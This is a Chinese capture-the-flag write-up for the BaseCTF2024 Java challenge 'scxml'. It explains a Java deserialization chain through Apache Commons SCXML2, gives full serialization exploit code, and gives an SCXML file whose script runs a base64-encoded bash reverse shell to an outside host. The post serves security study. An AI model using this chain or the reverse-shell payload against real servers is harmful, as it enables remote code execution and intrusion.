---
title: BaseCTF2024_JAVA题解(一血)
---

*作者：Narcher*	*时间：2024/9/13*	*分类：writeup*

<!--more-->

### [Fin] scxml

#### 前言

<img src="BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/image-20240915211020451.png" alt="image-20240915211020451" style="zoom:50%;" />

看见有java题没人做，于是便做了做，感觉还行，直到比赛结束只有三解

#### 正文

N1师傅的题，难度刚刚好

<img src="BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/image-20240913115829227.png" alt="image-20240913115829227" style="zoom:50%;" />

先下载附件看看：

<img src="BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/image-20240913115938570.png" alt="image-20240913115938570" style="zoom: 67%;" />

有一个自定义的包n1ght.jar，打开分析一下：

<img src="BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/image-20240913120048524.png" alt="image-20240913120048524" style="zoom:50%;" />

自定义写了个类，并含有toString方法，再看看Main：

```java
import com.sun.net.httpserver.HttpServer;
import javax.naming.InitialContext;
import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {
        var port = Integer.parseInt(System.getenv().getOrDefault("PORT", "8000"));
        var server = HttpServer.create(new java.net.InetSocketAddress(port), 0);
        server.createContext("/", req -> {
            var code = 200;
            var response = switch (req.getRequestURI().getPath()) {
                case "/scxml" -> {
                    try {
                        var param = req.getRequestURI().getQuery();
                        yield new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(java.util.Base64.getDecoder().decode(param))).readObject().toString();
                    } catch (Throwable e) {
                        e.printStackTrace();
                        yield ":(";
                    }
                }
                default -> {
                    code = 404;
                    yield "Not found";
                }
            };
            req.sendResponseHeaders(code, 0);
            var os = req.getResponseBody();
            os.write(response.getBytes());
            os.close();
        });
        server.start();
        System.out.printf("Server listening on :%s\n", port);
    }
}
```

发现在/scxml路由下对查询的参数进行了Base64解密，并在反序列化后执行了toString方法，再联想到上边那个自定义包里的类，八成是用那个InvokerImpl类作为入口点，再结合下边的依赖以及题目名字，不难想到scxml的RCE漏洞：[Apache SCXML2 RCE漏洞_scxml scxmlexecutor-CSDN博客](https://blog.csdn.net/m0_73512445/article/details/134451789)

<img src="BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/image-20240913120435194.png" alt="image-20240913120435194" style="zoom:67%;" />

当然，我们还是回到上边继续跟题目来：

<img src="BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/image-20240913120742029.png" alt="image-20240913120742029" style="zoom:67%;" />

InvokerImpl的构造器要求传入三个参数，第一个Invoker有点可疑，点进去看看：

<img src="BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/image-20240913120825966.png" alt="image-20240913120825966" style="zoom:50%;" />

发现是个接口，那么我们去找找它的实现类，结果发现只有一个SimpleSCXMLInvoker类，结合上边贴出来的那个漏洞，打就完了

因为InvokerImpl触发的是SimpleSCXMLInvoker类的invoke方法，我们看一下：

```java
    public void invoke(String source, Map<String, Object> params) throws InvokerException {
        SCXML scxml = null;
        try {
            scxml = SCXMLReader.read(new URL(source));
        } catch (ModelException var9) {
            throw new InvokerException(var9.getMessage(), var9.getCause());
        } catch (IOException var10) {
            throw new InvokerException(var10.getMessage(), var10.getCause());
        } catch (XMLStreamException var11) {
            throw new InvokerException(var11.getMessage(), var11.getCause());
        }

        Evaluator eval = this.parentSCInstance.getEvaluator();
        this.executor = new SCXMLExecutor(eval, new SimpleDispatcher(), new SimpleErrorReporter());
        Context rootCtx = eval.newContext((Context)null);
        Iterator var6 = params.entrySet().iterator();

        while(var6.hasNext()) {
            Map.Entry<String, Object> entry = (Map.Entry)var6.next();
            rootCtx.setLocal((String)entry.getKey(), entry.getValue());
        }

        this.executor.setRootContext(rootCtx);
        this.executor.setStateMachine(scxml);
        this.executor.addListener(scxml, new SimpleSCXMLListener());
        this.executor.registerInvokerClass("scxml", this.getClass());

        try {
            this.executor.go();
        } catch (ModelException var8) {
            throw new InvokerException(var8.getMessage(), var8.getCause());
        }

        if (this.executor.getCurrentStatus().isFinal()) {
            TriggerEvent te = new TriggerEvent(this.eventPrefix + invokeDone, 3);
            (new AsyncTrigger(this.parentSCInstance.getExecutor(), te)).start();
        }
    }
```

很简单的逻辑，对我们传入的source进行URL查询后，解析所得的xml文件并执行，其实到`this.executor.go();`就结束了，之后注意一下前边调用到的参数都一一传参避免在前边报错就好了：

```java
import com.n1ght.InvokerImpl;
import org.apache.commons.scxml2.SCInstance;
import org.apache.commons.scxml2.SCXMLExecutor;
import org.apache.commons.scxml2.env.SimpleContext;
import org.apache.commons.scxml2.env.SimpleErrorReporter;
import org.apache.commons.scxml2.env.jexl.JexlEvaluator;
import org.apache.commons.scxml2.invoke.SimpleSCXMLInvoker;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception {
        SCXMLExecutor executor = new SCXMLExecutor();
        executor.setRootContext(new SimpleContext());
        executor.setEvaluator(new JexlEvaluator());
        executor.setErrorReporter(new SimpleErrorReporter());
        Class c = Class.forName("org.apache.commons.scxml2.SCInstance");
        Constructor constructor = c.getDeclaredConstructor(SCXMLExecutor.class);
        constructor.setAccessible(true);
        SCInstance scInstance = (SCInstance) constructor.newInstance(executor);
        setValue(scInstance,"evaluator", new JexlEvaluator());
        SimpleSCXMLInvoker simpleSCXMLInvoker = new SimpleSCXMLInvoker();
        simpleSCXMLInvoker.setSCInstance(scInstance);
        Map<String, Object> params = new HashMap<>();
        params.put("Narcher","Alter");
        InvokerImpl invoker = new InvokerImpl(simpleSCXMLInvoker,"http://1.1.1.1:6666/scxml2.xml",params);//vps地址
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(invoker);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray())));
    }
    public static void setValue(Object obj,String name,Object value)throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

其中scxml2.xml内容如下（记得自己改vps地址）：

```java
<?xml version="1.0"?>
<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="run">
        <state id="run">
                <onentry>
                        <script>
                                ''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzc3NzcgMD4mMQo=}|{base64,-d}|{bash,-i}')
                        </script>
                </onentry>
        </state>
</scxml>
```

之后用我上边的链子打就完了（记得url编码），下面附上图：

<img src="BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/image-20240913122709575.png" alt="image-20240913122709575" style="zoom:50%;" />

<img src="BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/image-20240913122626236.png" alt="image-20240913122626236" style="zoom:67%;" />

<img src="BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/image-20240913122747697.png" alt="image-20240913122747697" style="zoom:67%;" />

成功反弹shell并命令执行获得flag

#### 小结

本题的难度在于网上没有现成的payload，从头自己找一条链子对于大多数脚本小子来说可能有些难度，其次就是没注意到应该把链子放在传参的key上或者是在自己构造链子的时候各种地方漏了赋值等等，题目总的来说还挺好玩的

最后贴上一血：

<img src="BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/qq_pic_merged_1726140343822.jpg" alt="qq_pic_merged_1726140343822" style="zoom: 80%;" />